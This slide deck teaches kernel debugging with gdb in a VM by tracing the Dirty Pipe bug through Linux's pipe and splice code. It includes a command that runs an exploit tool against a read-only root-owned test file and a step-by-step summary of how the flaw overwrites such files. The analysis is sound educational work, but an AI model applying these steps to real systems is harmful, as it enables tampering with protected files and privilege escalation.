$ virsh edit debian11
<domain xmlns:qemu="http://libvirt.org/schemas/domain/qemu/1.0" type="qemu">
<qemu:commandline>
  <qemu:arg value='-s'/>
</qemu:commandline>
```

* Set runlevel non-graphical in VM
<!-- to prevent a bit of unnecessary background noise -->
```bash
$ sudo systemctl set-default multi-user.target
```

<!--
Get some way to get console on VM system from host: Either

 1. Console

In VM:
```bash
$ sudo systemctl enable --now serial-getty@ttyS0.service
```

On host:
```bash
$ virsh console debian11
```

 2. SSH

In VM: setup ssh
```bash
$ sudo apt install openssh-server
$ sudo systemctl enable --now ssh.service
```

On host:
* In virt-manager network config: add new isolated network
* In virt-manager vm config: set network to new isolated network with IPv4 config (IP subnet and DHCP)
* Create and copy SSH key:
```bash
$ ssh-keygen -f ~/.ssh/vm_demo_key -b 4096
$ ssh-copy-id -i ~/.ssh/vm_demo_key.pub demo@192.168.123.186
$ ssh -i ~/.ssh/vm_demo_key demo@192.168.123.186
```
-->

<!--
Mount shared data:
```bash
$ sudo mount -t 9p -o trans=virtio data ~/data
```
-->

## Setup: Quick recap kernel compilation and installation

Refer to previous presentation for more detailed writeup

```bash
$ podman run -ti -v .:/data docker.io/debian:bullseye /bin/bash
$ sed -i 'p; s/^deb/deb-src/' /etc/apt/sources.list ; cat /etc/apt/sources.list
$ apt-get update
$ apt search linux-source
$ apt show linux-source
$ apt show linux-source-5.10
$ apt-cache policy linux-source-5.10
$ apt-get -y install build-essential fakeroot linux-source-5.10=5.10.84-1
$ apt-get -y build-dep linux
```

## Setup: Quick recap kernel compilation and installation

```bash
$ cd /data/ ; tar xaf /usr/src/linux-source-*.tar.xz ; cd linux-source-*
$ xzcat /usr/src/linux-config-*/config.amd64_none_amd64.xz > .config

$ scripts/config --set-str CONFIG_BUILD_SALT "KERNEL_DEBUGGING"
$ scripts/config --disable CONFIG_MODULE_SIG
$ scripts/config --disable CONFIG_MODULE_SIG_ALL
$ scripts/config --set-str CONFIG_MODULE_SIG_KEY ""
$ scripts/config --set-str CONFIG_SYSTEM_TRUSTED_KEYS ""
$ scripts/config --enable CONFIG_GDB_SCRIPTS
$ scripts/config --enable CONFIG_FRAME_POINTER
```

## Setup: Quick recap kernel compilation and installation

```bash
$ diff --color -u <(xzcat /usr/src/linux-config-*/config.amd64_none_amd64.xz) .config

$ make clean
$ make -j $(nproc) bindeb-pkg

$ cd ../ ; ls -ald linux-*

$ sudo dpkg -i linux-image-5.10.84_5.10.84-1_amd64.deb

$ ln -srfv scripts/gdb/vmlinux-gdb.py vmlinux-gdb.py
```

## Debugging strategy

* Start from interface between userspace / kernelspace (=syscalls); go from there

* Problem: following transition from userspace to kernelspace not easily possible

## Debugging strategy

To get both sides: start two gdb instances

  * for kernel (from host)

```bash
$ gdb -q \
    -iex "add-auto-load-safe-path $PWD" \
    -ex "source $PWD/vmlinux-gdb.py" \
    -ex 'target remote :1234' \
    -ex "set substitute-path /data/linux-source-5.10/ $PWD" \
    -ex "set disassembly-flavor intel" \
    vmlinux
```

  * for userspace (from inside VM)

```bash
$ prepare_file
$ gdb -q --args ./write_anything /tmp/tmp/testfile 1 $'BBBB'
```

<!--
~/.gdbinit
```
set disassembly-flavor intel
set print pretty on
```
-->

## Sidenote: browsing c source code in vim

* Use ctags for navigation

```
[demo@demo linux-source-5.10]$ ctags -R .
```

```
:help tag
:help :tag
:help tselect
:help CTRL-]
:help CTRL-o
:help ltag
:help lopen
```

* Example

```
:tag do_splice
:ts
````

<!--
.vimrc for browsing linux source code:

```
set sts=8 ts=8 sw=8
set background=dark
colorscheme desert
set number
let g:html_id_expr = '"_".strftime("%s")'
```

Workflow for generating syntax-highlighted HTML:

* mark range

* generate html in source file in vim
```
:set background=light | colorscheme desert
:TOhtml
:v/^<span/d
:%s/class="\([^"]*\)"/class="vim\1"/g
```

* paste result in marp markdown document; wrap it inside
```
<pre class='vimCodeElement'>
...
</pre>
```

* paste style at top of marp markdown document
```
<style>
.vimCodeElement { white-space: pre-wrap; font-family: monospace; }
.vimConstant { color: #af5f00; }
.vimLineNr { color: #804000; }
.vimPreProc { color: #c000c0; }
.vimComment { color: #008080; }
</style>
```
-->

## Finding syscall implementations

Implementation of syscalls in Linux kernel (usually):

  * Using `SYSCALL_DEFINEx` family of macros

  * These are defined in `include/linux/syscalls.h`

## Finding syscall implementations

`include/linux/syscalls.h`

<pre class='vimCodeElement'>
<span id="L205_1648329693" class="vimLineNr">205 </span><span class="vimPreProc">#ifndef SYSCALL_DEFINE0</span>
<span id="L206_1648329693" class="vimLineNr">206 </span><span class="vimPreProc">#define SYSCALL_DEFINE0(sname)                                  \</span>
<span id="L207_1648329693" class="vimLineNr">207 </span><span class="vimPreProc">        SYSCALL_METADATA(_##sname, </span><span class="vimConstant">0</span><span class="vimPreProc">);                          \</span>
<span id="L208_1648329693" class="vimLineNr">208 </span><span class="vimPreProc">        asmlinkage </span><span class="vimType">long</span><span class="vimPreProc"> sys_##sname(</span><span class="vimType">void</span><span class="vimPreProc">);                      \</span>
<span id="L209_1648329693" class="vimLineNr">209 </span><span class="vimPreProc">        ALLOW_ERROR_INJECTION(sys_##sname, ERRNO);              \</span>
<span id="L210_1648329693" class="vimLineNr">210 </span><span class="vimPreProc">        asmlinkage </span><span class="vimType">long</span><span class="vimPreProc"> sys_##sname(</span><span class="vimType">void</span><span class="vimPreProc">)</span>
<span id="L211_1648329693" class="vimLineNr">211 </span><span class="vimPreProc">#endif</span> <span class="vimComment">/*</span><span class="vimComment"> SYSCALL_DEFINE0 </span><span class="vimComment">*/</span>
<span id="L212_1648329693" class="vimLineNr">212 </span>
<span id="L213_1648329693" class="vimLineNr">213 </span><span class="vimPreProc">#define SYSCALL_DEFINE1(name, ...) SYSCALL_DEFINEx(</span><span class="vimConstant">1</span><span class="vimPreProc">, _##name, </span><span class="vimConstant">__VA_ARGS__</span><span class="vimPreProc">)</span>
<span id="L214_1648329693" class="vimLineNr">214 </span><span class="vimPreProc">#define SYSCALL_DEFINE2(name, ...) SYSCALL_DEFINEx(</span><span class="vimConstant">2</span><span class="vimPreProc">, _##name, </span><span class="vimConstant">__VA_ARGS__</span><span class="vimPreProc">)</span>
<span id="L215_1648329693" class="vimLineNr">215 </span><span class="vimPreProc">#define SYSCALL_DEFINE3(name, ...) SYSCALL_DEFINEx(</span><span class="vimConstant">3</span><span class="vimPreProc">, _##name, </span><span class="vimConstant">__VA_ARGS__</span><span class="vimPreProc">)</span>
<span id="L216_1648329693" class="vimLineNr">216 </span><span class="vimPreProc">#define SYSCALL_DEFINE4(name, ...) SYSCALL_DEFINEx(</span><span class="vimConstant">4</span><span class="vimPreProc">, _##name, </span><span class="vimConstant">__VA_ARGS__</span><span class="vimPreProc">)</span>
<span id="L217_1648329693" class="vimLineNr">217 </span><span class="vimPreProc">#define SYSCALL_DEFINE5(name, ...) SYSCALL_DEFINEx(</span><span class="vimConstant">5</span><span class="vimPreProc">, _##name, </span><span class="vimConstant">__VA_ARGS__</span><span class="vimPreProc">)</span>
<span id="L218_1648329693" class="vimLineNr">218 </span><span class="vimPreProc">#define SYSCALL_DEFINE6(name, ...) SYSCALL_DEFINEx(</span><span class="vimConstant">6</span><span class="vimPreProc">, _##name, </span><span class="vimConstant">__VA_ARGS__</span><span class="vimPreProc">)</span>
<span id="L219_1648329693" class="vimLineNr">219 </span>
<span id="L220_1648329693" class="vimLineNr">220 </span><span class="vimPreProc">#define SYSCALL_DEFINE_MAXARGS  </span><span class="vimConstant">6</span>
<span id="L221_1648329693" class="vimLineNr">221 </span>
<span id="L222_1648329693" class="vimLineNr">222 </span><span class="vimPreProc">#define SYSCALL_DEFINEx(x, sname, ...)                          \</span>
<span id="L223_1648329693" class="vimLineNr">223 </span><span class="vimPreProc">        SYSCALL_METADATA(sname, x, </span><span class="vimConstant">__VA_ARGS__</span><span class="vimPreProc">)                 \</span>
<span id="L224_1648329693" class="vimLineNr">224 </span><span class="vimPreProc">        __SYSCALL_DEFINEx(x, sname, </span><span class="vimConstant">__VA_ARGS__</span><span class="vimPreProc">)</span>
</pre>

## syscall implementations: example pipe `fs/pipe.c`

For example: search for implementation of syscall `pipe`: <!-- `\b` is for word boundary -->

```c
$ rg '\bSYSCALL_DEFINE.*\bpipe\b'
fs/pipe.c
1027:SYSCALL_DEFINE1(pipe, int __user *, fildes)
```

=> Is indeed implemented in `fs/pipe.c`

<pre class='vimCodeElement'>
<span id="L1022_1648329939" class="vimLineNr">1022 </span>SYSCALL_DEFINE2(pipe2, <span class="vimType">int</span> __user *, fildes, <span class="vimType">int</span>, flags)
<span id="L1023_1648329939" class="vimLineNr">1023 </span>{
<span id="L1024_1648329939" class="vimLineNr">1024 </span>        <span class="vimStatement">return</span> do_pipe2(fildes, flags);
<span id="L1025_1648329939" class="vimLineNr">1025 </span>}
<span id="L1026_1648329939" class="vimLineNr">1026 </span>
<span id="L1027_1648329939" class="vimLineNr">1027 </span>SYSCALL_DEFINE1(pipe, <span class="vimType">int</span> __user *, fildes)
<span id="L1028_1648329939" class="vimLineNr">1028 </span>{
<span id="L1029_1648329939" class="vimLineNr">1029 </span>        <span class="vimStatement">return</span> do_pipe2(fildes, <span class="vimConstant">0</span>);
<span id="L1030_1648329939" class="vimLineNr">1030 </span>}
</pre>

## syscall implementations: example pipe `fs/pipe.c`

<pre class='vimCodeElement'>
<span id="L996_1648329983" class="vimLineNr"> 996 </span><span class="vimComment">/*</span>
<span id="L997_1648329983" class="vimLineNr"> 997 </span><span class="vimComment"> * sys_pipe() is the normal C calling standard for creating</span>
<span id="L998_1648329983" class="vimLineNr"> 998 </span><span class="vimComment"> * a pipe. It's not the way Unix traditionally does this, though.</span>
<span id="L999_1648329983" class="vimLineNr"> 999 </span><span class="vimComment"> </span><span class="vimComment">*/</span>
<span id="L1000_1648329983" class="vimLineNr">1000 </span><span class="vimType">static</span> <span class="vimType">int</span> do_pipe2(<span class="vimType">int</span> __user *fildes, <span class="vimType">int</span> flags)
<span id="L1001_1648329983" class="vimLineNr">1001 </span>{
<span id="L1002_1648329983" class="vimLineNr">1002 </span>        <span class="vimType">struct</span> file *files[<span class="vimConstant">2</span>];
<span id="L1003_1648329983" class="vimLineNr">1003 </span>        <span class="vimType">int</span> fd[<span class="vimConstant">2</span>];
<span id="L1004_1648329983" class="vimLineNr">1004 </span>        <span class="vimType">int</span> error;
<span id="L1005_1648329983" class="vimLineNr">1005 </span>
<span id="L1006_1648329983" class="vimLineNr">1006 </span>        error = __do_pipe_flags(fd, files, flags);
<span id="L1007_1648329983" class="vimLineNr">1007 </span>        <span class="vimStatement">if</span> (!error) {
<span id="L1008_1648329983" class="vimLineNr">1008 </span>                <span class="vimStatement">if</span> (unlikely(copy_to_user(fildes, fd, <span class="vimStatement">sizeof</span>(fd)))) {
<span id="L1009_1648329983" class="vimLineNr">1009 </span>                        fput(files[<span class="vimConstant">0</span>]);
<span id="L1010_1648329983" class="vimLineNr">1010 </span>                        fput(files[<span class="vimConstant">1</span>]);
<span id="L1011_1648329983" class="vimLineNr">1011 </span>                        put_unused_fd(fd[<span class="vimConstant">0</span>]);
<span id="L1012_1648329983" class="vimLineNr">1012 </span>                        put_unused_fd(fd[<span class="vimConstant">1</span>]);
<span id="L1013_1648329983" class="vimLineNr">1013 </span>                        error = -EFAULT;
<span id="L1014_1648329983" class="vimLineNr">1014 </span>                } <span class="vimStatement">else</span> {
<span id="L1015_1648329983" class="vimLineNr">1015 </span>                        fd_install(fd[<span class="vimConstant">0</span>], files[<span class="vimConstant">0</span>]);
<span id="L1016_1648329983" class="vimLineNr">1016 </span>                        fd_install(fd[<span class="vimConstant">1</span>], files[<span class="vimConstant">1</span>]);
<span id="L1017_1648329983" class="vimLineNr">1017 </span>                }
<span id="L1018_1648329983" class="vimLineNr">1018 </span>        }
<span id="L1019_1648329983" class="vimLineNr">1019 </span>        <span class="vimStatement">return</span> error;
<span id="L1020_1648329983" class="vimLineNr">1020 </span>}
</pre>

## Command overview

Following slides show outline of commands during interactive debugging.
(Mostly intended as speaker notes)

For better context / output see `recordings/` folder in the git repo.

<!--
.tmux.conf
```
set-option -g default-shell /bin/bash
set -g mouse on
set -g escape-time 0
set -g mode-keys vi
set -g history-limit 10000
set -g pane-border-status bottom
set -g status-right "#{?window_bigger,[#{window_offset_x}#,#{window_offset_y}] ,}\"#{=21:pane_title}\" %Y-%m-%d %H:%M"
```
-->

<!--
.bashrc host
```
export USER=host
export HOSTNAME=host
```

.bashrc vm
```
export USER=vm
export HOSTNAME=vm
```

both / common
```
export PS1="\n\[\033[01;32m\][${USER}@${HOSTNAME}\[\033[00m\] \[\033[01;34m\]\W]\[\033[00m\]\$ "
export TERM=xterm-256color
```
-->


<!--
BASE=2_debugging
script --timing=$BASE.timing $BASE.script

cd ~/Downloads/tmp_share/linux_kernel_build/linux-source-5.10/
tmux
# split vertical and name
:select-pane -T host
:select-pane -T vm

tip: toggle pane full screen ctrl-b z

##########
# left:
# open gdb
# open vim

##########
# right:
virsh start debian11
ssh -i ~/.ssh/vm_demo_key demo@192.168.123.186
sudo mount -t 9p -o trans=virtio data ~/data
cd ~/data/dirty_pipe/
prepare_file() {
  sudo rm -rfv /tmp/tmp ; mkdir /tmp/tmp
  echo AAAAAA > /tmp/tmp/testfile
  sudo chmod 0444 /tmp/tmp/testfile
  sudo chown -R root:root /tmp/tmp
  sudo -K
  ls -al /tmp/tmp
  cat /tmp/tmp/testfile
}
# then open gdb
# open vim write_anything.c

##########
# on both
(gdb) tui enable
-->

## Debug transition userspace / kernelspace

Goal: better handling of switches between userspace kernelspace

List of relevant syscalls from previous analysis with strace:

* openat
* fstat
* **pipe**
* write
* read
* **splice**

## Debug transition userspace / kernelspace: In VM

```
break main

run

# break on every switch from userspace to kernel
help catch
help catch syscall
catch syscall

info breakpoints
continue
```

## Debug transition userspace / kernelspace: On host

Identify syscall implementations in kernel

```c
$ rg '\bSYSCALL_DEFINE.*\bopenat\b'
fs/open.c
1207:SYSCALL_DEFINE4(openat, int, dfd, const char __user *, filename, int, flags,

$ rg '\bSYSCALL_DEFINE.*\bfstat\b'
fs/stat.c
288:SYSCALL_DEFINE2(fstat, unsigned int, fd, struct __old_kernel_stat __user *, statbuf)

$ rg '\bSYSCALL_DEFINE.*\bpipe\b'
fs/pipe.c
1027:SYSCALL_DEFINE1(pipe, int __user *, fildes)

$ rg '\bSYSCALL_DEFINE.*\bwrite\b'
fs/read_write.c
667:SYSCALL_DEFINE3(write, unsigned int, fd, const char __user *, buf,

$ rg '\bSYSCALL_DEFINE.*\bread\b'
fs/read_write.c
642:SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count)

$ rg '\bSYSCALL_DEFINE.*\bsplice\b'
fs/splice.c
1325:SYSCALL_DEFINE6(splice, int, fd_in, loff_t __user *, off_in,
```

<!-- => look into source in vim -->

## Debug transition userspace / kernelspace: On host

* break on every relevant syscall

* but: break only when we are in correct program

GDB allows breakpoint conditions:

```
(gdb) help break
```

## Debug transition userspace / kernelspace: On host

Approach 1: Compare string binary name (naive)

```
(gdb) p strstr($lx_current().comm, "write_anything")
evaluation of this expression requires the program to have a function "malloc".

(gdb) p memcmp($lx_current().comm, "write_anything", 14)
evaluation of this expression requires the program to have a function "malloc".

(gdb) p $lx_current().comm == "write_anything"
evaluation of this expression requires the program to have a function "malloc".

(gdb) p $_memeq("123","123",3)
Python Exception <class 'gdb.error'>: evaluation of this expression requires the program to have a function "malloc".
Error occurred in Python: evaluation of this expression requires the program to have a function "malloc".
```

=> doesn't work (string literal constant requires malloc)

## Debug transition userspace / kernelspace: On host

Approach 2: Compare PID

```
(gdb) p $lx_current().pid == ...
```

=> Works, but: requires reading out dynamic PID from userspace gdb each time
=> Cumbersome

## Debug transition userspace / kernelspace: On host

Approach 3: Compare string binary name char-by-char or with integer constant

```
(gdb) p $lx_current().comm[0] == 'w' && ...
(gdb) p *((u32 *) $lx_current().comm) == 0x... && ...
(gdb) p *((u64 *) $lx_current().comm) == 0x... && ...
```

<!--
Working version:
```
>>> list(struct.iter_unpack('@I',b'write_anythi'))
[(1953067639,), (1851875173,), (1768453241,)]

set $comm = $lx_current().comm
p (*((u32 *)  $comm)    == 1953067639) &&
  (*((u32 *) ($comm+4)) == 1851875173) &&
  (*((u32 *) ($comm+8)) == 1768453241)
```
-->

```
>>> struct.unpack('@Q',b'write_an')
(7953743306262409847,)

(gdb) p *((u64 *) $lx_current().comm) == 7953743306262409847
(gdb) hbreak copy_page_to_iter if *((u64 *) $lx_current().comm) == 7953743306262409847
```
=> that works well enough <!-- if there are no other similarly named processes -->

<!-- If someone has better way: please tell me -->

## Debug transition userspace / kernelspace: On host

Set breakpoints on relevant syscall implementations

```
(gdb) hbreak do_sys_open if *((u64 *) $lx_current().comm) == 7953743306262409847
(gdb) hbreak vfs_fstat   if *((u64 *) $lx_current().comm) == 7953743306262409847
(gdb) hbreak do_pipe2    if *((u64 *) $lx_current().comm) == 7953743306262409847
(gdb) hbreak ksys_write  if *((u64 *) $lx_current().comm) == 7953743306262409847
(gdb) hbreak ksys_read   if *((u64 *) $lx_current().comm) == 7953743306262409847
(gdb) hbreak __do_splice if *((u64 *) $lx_current().comm) == 7953743306262409847
(gdb) info breakpoints
```

<!--
# host: continue
# vm: run
-->

<!--
## Command overview
-->

<!--
# user: __libc_open64
up
continue
-->

<!--
# kernel: vfs_open
p filename
i args
c
-->

<!--
# kernel: vfs_fstat
ptype stat
p *stat
:tag vfs_fstat
:ts
c
-->

<!--
# user: prepare_pipe
list
c
-->

<!--
# kernel: do_pipe2
info frame
bt
:tag do_pipe2
:ts
=> __do_pipe_flags
# essentially reserves two file descriptors; setup/maintenance of data structure circular buffer itself happens later e.g. during read/write
c
-->

<!--
# kernel: ksys_write: write zeroes to fill pipe
i f
bt
:tag ksys_write
=> vfs_write (602 f_op dynamic dispatch, oop-like; )
next # (until vfs_write)
step
next # (until 602)
# Layers of abstractions (like in OOP classes); during read; struct with function pointers; later dynamically dispatched
# dynamic dispatch depending on file system (ext4, fat, ...) / in memory / ...
# vfs is general interface with different concrete implementations
ptype file
info types ^file$
:tag file
:ts
:ltag file
:lopen
/struct file {    # enter
=> file_operations
p *file->f_op
p file->f_op->write
p file->f_op->write_iter
next
step # 605
step # into new_sync_write
:tag new_sync_write
next # until call_write_iter
step
bt
=> call_write_iter # again dynamic dispatch
p file->f_op->write_iter
:tag pipe_write
:ts
list
step
bt
i f
i ar
ptype *iocb
p *iocb
# kiocb => kernel i/o call back
ptype *from
p *from
info types iov_iter
:e include/linux/uio.h
/iov_iter
# https://lwn.net/Articles/625077/ The iov_iter interface
# One of the most common tasks in the kernel is processing a buffer of data supplied by user space, possibly in several chunks. Perhaps unsurprisingly, this is a task that kernel code often gets wrong, leading to bugs and, possibly, security problems. The kernel contains a primitive (called "iov_iter") meant to make this task simpler
info line
list
ptype pipe
:stag pipe_inode_info
# struct pipe_inode_info is pipe
# highlight:
#   bufs: ring/circular buffer datastructure (struct pipe buffer)
#   head/tail: read/write ends of the pipe (int)
#   ring_size: (int)
p pipe
# intermediate values optimized out / continue
# goal: fill pipe a bit more, so that multiple entries are in the ring buffer
c 5

next # until vfs_write
step
next # until new_sync_write
step
next # until call_write_iter
step
step # into pipe_write

next # until after pipe assigned (426)

p pipe
p *pipe
p pipe.head
p pipe.tail
# no reads so far => tail=0; number of writes in head

# ring buffer
ptype pipe
ptype pipe.bufs
:tag pipe_buffer
# highlight:
#   page: pointer to memory page (anonymous, or later after splice: backed by file system / file on disk)
#   flags: control/permission information for that page

# pointer to struct pipe_buffer is array; inspect in memory in gdb
# p sizeof(struct pipe_buffer)
p pipe. tab tab
p pipe.ring_size

p pipe.bufs[0]
p pipe.bufs[1]
p pipe.bufs[2]

ptype pipe.bufs[0].ops # anon_pipe_buf_ops
# pipe_buf_operations: again dynamic dispatch

# flags in include/linux/pipe_fs_i.h
:tag PIPE_BUF_FLAG_CAN_MERGE
p pipe.bufs[0].flags
p pipe.bufs[0].flags & 0x10
# => PIPE_BUF_FLAG_CAN_MERGE is set; correct: anonymous pipe, its pages should be appendable

# => section for write of zeroes in prepare_pipe finished; disable breakpoint (for now), until write of BBBB
info breakpoints
disable breakpoints <NUM>
continue
-->

<!--
# user: disable read / write catchpoints
info breakpoints
disable breakpoints
catch syscall openat fstat pipe splice
c
-->

<!--
# kernel: ksys_read: drain pipe read zeroes
# analogous / similar to ksys_write
next # until vfs_read
step
next # until new_sync_read
step
next # until call_read_iter
step
step # into pipe_read

info line
bt
list

:tag pipe_read
next # until pipe is set
p pipe.bufs[0]

# again let pipe drain a bit
c 5

hbreak pipe_read  # so we don't have to step manually
info breakpoints
continue
next # until pipe is set
p pipe.ring_size
p pipe.head # head should be incremented
p pipe.tail # tail should be the same as after write
p pipe.bufs[0].flags

info breakpoints
disable breakpoints <NUMS> # ksys_read pipe_read

continue
-->

<!--
# kernel: __do_splice
:tag __do_splice

next # until do_splice
step
=> follow in vim

next
# ipipe / opipe: identify which of in / out is pipe
p ipipe
p opipe
# => we see ipipe is NULL, opipe is struct pipe_inode_info => splicing from file to pipe

next # until do_splice_to
step
=> follow in vim

next # until end splice_read; again dynamic dispatch
p in # => file => different dynamic io function than for pipe before (pipe_read); reading from file
ptype in
p *in->f_op
p in->f_op->splice_read
step # into generic_file_splice_read

:tag generic_file_splice_read

next # until call_read_iter
step
=> follow in vim

p file->f_op->read_iter # optimized out => function probably inlined
# => we need to step by assembly instruction to catch next function
x/10i $pc
# enter
layout asm
stepi # until one after: jmp <generic_file_read_iter
layout src
tui disable
bt
list
:tag generic_file_read_iter
:ts
# show comments to function

next # until generic_file_buffered_read
step
# => follow in vim

next # until copy_page_to_iter
step
# => follow in vim

next # until copy_page_to_iter_pipe
step
# => follow in vim

next # => somehow optimizied? skips most of code...

# set targeted breakpoint without having to go through it manually
disable breakpoints
hbreak copy_page_to_iter_pipe
info breakpoints
continue
# in VM in gdb: disable breakpoints and rerun

bt
info locals # => heavily optimized out
# slight mismatch between source code listing and actual compiled binary
# can't be reconstructed 1:1
tui enable
nexti # until 415 after buf->len = bytes;
# open up fix again
# line 409-417 are interesting, flags are not reset
p buf
p *buf
p *buf.ops # we see: functions associated with page_cache; not like previously with anonymous pipe (anon_pipe_buf_ops)
# then: verify flag PIPE_BUF_FLAG_CAN_MERGE is still set on the page, even though it points to different page now, that is backed by file on disk
p buf.flags # not reset, still 16 / 0x10 / PIPE_BUF_FLAG_CAN_MERGE from before

fin # until back in do_splice
info locals
p opipe
# verify flag PIPE_BUF_FLAG_CAN_MERGE is still set on the page at end of splice (logic taken from source code)
p opipe.bufs[opipe->tail & (opipe->ring_size-1)]
info breakpoints
enable breakpoint # num for ksys_write
c
-->

<!--
# kernel: ksys_write: malicious / unintended write of Bs
info args # => BBBB
next # until vfs_write
step
next # until new_sync_write
step
next # until call_write_iter
step
p file->f_op->write_iter
step # into pipe_write
next # until pipe is assigned
p pipe
# verify flag PIPE_BUF_FLAG_CAN_MERGE is still set on the page at beginning of malicious write
p pipe.bufs[pipe->tail & (pipe->ring_size-1)]
# => very same page pointer from before, still ops page_cache_pipe_buf_ops; flag PIPE_BUF_FLAG_CAN_MERGE is still set
# rest is uninteresting
continue
-->

<!--
# kernel: ksys_write: It worked
continue
# user: program finished; process exited normally
-->

<!-- ## more gdb tricks -->

<!-- print dynamically dispatched reads and writes
rg 'SYSCALL_DEFINE.*\bread\b' -C3
rg 'SYSCALL_DEFINE.*\bwrite\b' -C3
ksys_read / ksys_write: => deterministic paths
ksys_read -> vfs_read
ksys_write -> vfs_write

delete breakpoints
hbreak vfs_read if *((u64 *) $lx_current().comm) == 7953743306262409847
commands
print file->f_op->read
print file->f_op->read_iter
continue
end
info breakpoints
continue

then in vm gdb: run

delete breakpoints
hbreak vfs_write if *((u64 *) $lx_current().comm) == 7953743306262409847
commands
print file->f_op->write
print file->f_op->write_iter
continue
end
info breakpoints
continue

:tag pipe_read
=> directly in that function: copy_page_to_iter -> copy_page_to_iter_pipe which is the vulnerable function

:tag pipe_write
-->

<!-- automated print stack frame for all copy_page_to_iter_pipe
delete breakpoints
hbreak copy_page_to_iter if *((u64 *) $lx_current().comm) == 7953743306262409847
hbreak copy_page_to_iter_pipe if *((u64 *) $lx_current().comm) == 7953743306262409847
commands
backtrace
continue
end
info breakpoints
continue

=> only 1 hit

commands
end

frame 5
:tag do_splice_to
print in->f_op->splice_read
:tag generic_file_splice_read
:tag call_read_iter
frame 3
print file->f_op->read_iter

hbreak call_read_iter if *((u64 *) $lx_current().comm) == 7953743306262409847
commands
step
continue
end
-->

<!--
rbreak fs/splice.c:.*
debug once with prepare-pipe, and once without
-->

#

## Summary of exploit steps

* create anonymous pipe in memory

* fill (write) and drain (read) pipe
  *=> `PIPE_BUF_FLAG_CAN_MERGE` is set on all pages / all pages are appendable*

* open file read-only; splice from file to pipe
  *=> page pointer of pipe points to page cache (backed by file)*
  *=> `PIPE_BUF_FLAG_CAN_MERGE` is not reset; page stays appendable*

* write to pipe; data is appended to page in page cache

* kernel writes page cache back to disk

## That's it

Any questions?

# Appendix

## Example output

For completeness sake and also as a reference, the git repository also contains some example terminal recordings. These can be replayed as follows:

```bash
BASE=recordings/2_debugging
scriptreplay --timing="$BASE.timing" "$BASE.script" --maxdelay 1 --divisor 2
```

<!--
Ctrl+S pauses the playback, Ctrl+Q resumes.
If that doesn't work directly, suspend first time with Ctrl+Z, then fg, then it should work.
Alternatively:
```bash
alias s='kill -STOP $(pgrep scriptreplay)  # pause'
alias q='kill -CONT $(pgrep scriptreplay)  # continue'
# toggle
while true; do
  read < /dev/tty; s
  read < /dev/tty; q
done
```
-->

<!-- reduce image size:
pngquant --ext .png --force --speed 1 *.png
-->
